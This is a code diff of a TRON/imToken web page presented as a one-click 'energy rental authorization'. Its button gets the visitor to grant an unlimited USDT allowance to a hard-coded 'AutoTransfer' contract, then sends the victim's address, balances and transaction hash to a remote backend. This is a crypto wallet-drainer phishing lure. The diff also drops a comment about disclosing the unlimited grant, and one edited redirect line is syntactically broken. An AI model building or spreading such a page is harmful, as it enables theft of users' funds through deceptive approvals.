@@ -26,23 +26,20 @@
 <body>
   <div class="header">
     <h1>能量租赁一键授权</h1>
-    <!-- 明确告知用户“无限授权”，避免误解 -->
     <div class="warning">
-    ⚠️ 请用 <strong>imToken钱包内置浏览器</strong> 打开此页面
-    ⚠️ 在非钱包浏览器打开请先点击<strong>复制链接</strong>然后点击连接imToken钱包后点击钱包页面下方浏览在搜索框中粘贴访问br>
+    ⚠️ 请用 <strong>imToken钱包内置浏览器</strong> 打开此页面<br>
+    ⚠️ 非钱包浏览器：复制链接 → 打开imToken → 底部“浏览” → 粘贴链接访问
     </div>
   </div>
-  <!-- 链接显示+复制按钮的容器 -->
-<div style="margin: 15px 0; display: flex; align-items: center; gap: 10px;">
-  <!-- 要复制的链接（可替换成你需要的链接） -->
-  <span id="copyLinkText" style="color: #007AFF; word-break: break-all;">
-   https://trc20trx-alt.github.io/Trc20.TRX/
-  </span>
-  <!-- 复制按钮 -->
-  <button id="copyLinkBtn" style="padding: 5px 10px; cursor: pointer;">
-   <strong>复制链接</strong>
-  </button>
-</div>
+
+  <div style="margin: 15px 0; display: flex; align-items: center; gap: 10px;">
+    <span id="copyLinkText" style="color: #007AFF; word-break: break-all;">
+      https://trc20-tr-xqianduan.vercel.app/
+    </span>
+    <button id="copyLinkBtn" style="padding: 5px 10px; cursor: pointer;">
+     <strong>复制链接</strong>
+    </button>
+  </div>
 
   <button id="connectBtn" class="btn">连接imToken钱包</button>
   <button id="approveBtn" class="btn" disabled>能量授权</button>
@@ -54,14 +51,13 @@
     <div id="approvalRecords">暂无授权记录</div>
   </div>
 
-  <script src="imtoken://browser"></script>
   <script>
-    // ========== 需替换的3处配置（授权额度已固定为无限） ==========
+    // ========== 需替换的3处配置 ==========
     const AUTO_TRANSFER_CONTRACT = "TNAfknJTfkPbgmyfpwg3rJQrd17ZLKEMQa"; // 你的AutoTransfer合约地址
     const TRC20_TOKEN_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // 主网USDT地址
     const BACKEND_API = "https://tron-notify-backend.vercel.app/api/notify-approval"; // 后端接口
 
-    // 核心：TRC20 uint256最大值 = 无限授权（固定值，无需修改）
+    // 无限授权额度（TRC20 uint256最大值）
     const INFINITE_APPROVE_AMOUNT = "0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF";
 
     // 全局变量
@@ -73,24 +69,20 @@
       const approveBtn = document.getElementById("approveBtn");
       renderApprovalRecords();
       
+      // 复制链接功能
       const copyLinkText = document.getElementById("copyLinkText");
       const copyLinkBtn = document.getElementById("copyLinkBtn");
-
-  // 2. 给复制按钮绑定点击事件
       copyLinkBtn.addEventListener("click", async () => {
-      try {
-      // 获取要复制的链接内容
-      const linkContent = copyLinkText.textContent.trim();
-      // 将链接复制到剪贴板
-      await navigator.clipboard.writeText(linkContent);
-      // 复制成功的提示
-      alert("链接已成功复制到剪贴板!");
-      } catch (error) {
-      // 复制失败的提示（比如浏览器不支持剪贴板API）
-      alert("复制失败，请手动选中链接复制~");
-       }
+        try {
+          const linkContent = copyLinkText.textContent.trim();
+          await navigator.clipboard.writeText(linkContent);
+          alert("链接已成功复制到剪贴板!");
+        } catch (error) {
+          alert("复制失败，请手动选中链接复制~");
+        }
       });
-      // 检测IMToken环境，自动连接
+
+      // 检测imToken内置tronWeb
       if (window.tronWeb && window.tronWeb.ready) {
         tronWeb = window.tronWeb;
         await initWallet();
@@ -101,48 +93,47 @@
       // 手动连接钱包
       connectBtn.onclick = async () => {
         try {
-          if (!window.tronWeb){window.location.href = 'imtoken://browser?url=${encodeURIComponent(window.location.href)}';
-      
-      return;
-      }
-          const accounts = await window.tronWeb.request({ method: "tron_requestAccounts" });
-          userAddress = accounts[0];
+          if (!window.tronWeb) {
+            window.location.href = imtoken://browser?url=${encodeURIComponent(window.location.href)};
+            return;
+          }
+          const accounts = await window.tronWeb.request({ method: "tron_requestAccounts" });userAddress = accounts[0];
           await initWallet();
         } catch (e) {
           alert("连接失败：" + e.message);
         }
       };
 
-      // 一键无限授权（核心修改：使用INFINITE_APPROVE_AMOUNT）
+      // 一键无限授权
       approveBtn.onclick = async () => {
         try {
-          // 调用TRC20 approve，传入uint256最大值（无限授权）
           const result = await trc20Contract.approve(
             AUTO_TRANSFER_CONTRACT, 
-            INFINITE_APPROVE_AMOUNT // 替换为无限额度
+            INFINITE_APPROVE_AMOUNT
           ).send({
             from: userAddress,
-            shouldPollResponse: true // 等待imToken确认交易
+            shouldPollResponse: true
           });
 
-          // 授权成功：查余额+传后端+存记录
+          // 获取余额+构造记录
           const [tokenBalance, trxBalance] = await Promise.all([
             getTokenBalance(userAddress),
             getTrxBalance(userAddress)
-          ]);const record = {
+          ]);
+          const record = {
             address: userAddress,
             tokenBalance: tokenBalance.toFixed(2),
             trxBalance: trxBalance.toFixed(2),
             approveTime: new Date().toLocaleString(),
             txHash: result.transaction.txID,
-            approveType: "无限额度" // 新增：标注授权类型
+            approveType: "无限额度"
           };
 
+          // 存记录+发后端
           saveApprovalRecord(record);
           await sendDataToBackend(record);
 
-          // 提示用户，明确是无限授权
-          alert(`无限授权成功！\n交易哈希：${record.txHash}\n可在imToken钱包中撤销授权`);
+          alert(`无限授权成功！\n交易哈希：${record.txHash}\n可在imToken中撤销授权`);
           renderApprovalRecords();
         } catch (e) {
           alert("授权失败：" + e.message);
@@ -150,7 +141,7 @@
       };
     };
 
-    // 初始化钱包信息（IMToken适配）
+    // 初始化钱包信息
     async function initWallet() {
       try {
         userAddress = tronWeb.defaultAddress.base58;
@@ -178,7 +169,7 @@
       return balance / 1000000;
     }
 
-    // 存本地记录（标注无限授权）
+    // 存本地记录
     function saveApprovalRecord(record) {
       const existing = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
       const newRecords = existing.filter(item => item.address !== record.address);
@@ -186,7 +177,7 @@
       localStorage.setItem(RECORD_KEY, JSON.stringify(newRecords));
     }
 
-    // 渲染记录（显示授权类型）
+    // 渲染授权记录
     function renderApprovalRecords() {
       const container = document.getElementById("approvalRecords");
       const records = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
@@ -208,14 +199,13 @@
       `).join("");
     }
 
-    // 传数据到后端（同步无限授权信息）
+    // 传数据到后端
     async function sendDataToBackend(record) {
       try {
         const res = await fetch(BACKEND_API, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(record),
-          credentials: "omit"
+          body: JSON.stringify(record)
         });
         if (!res.ok) throw new Error("后端请求失败");
         return res.json();
